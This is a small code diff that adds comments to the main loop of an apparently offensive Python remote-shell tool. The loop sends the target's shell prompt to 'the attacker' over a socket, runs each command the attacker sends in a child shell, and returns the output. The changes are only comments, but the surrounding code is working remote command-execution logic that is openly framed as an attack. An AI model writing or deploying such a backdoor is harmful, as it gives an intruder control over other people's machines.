@@ -18,14 +18,16 @@ def main():
 
     # receive and process user commands and return output
     while True:
+        # get the shell prompt and send it to the attacker
         prompt = child_shell.after
-
         client_socket.send(prompt)
 
+        # wait for the attacker to send a command and then run it
         received_command = client_socket.receive()
         child_shell.sendline(received_command)
         index = child_shell.expect(TARGET_SHELL_PROMPT_REGEX_LIST)
 
+        # send the output of the command back to the attacker
         command_output = child_shell.before # also includes actual command but could get rid of?
         client_socket.send(command_output)
 
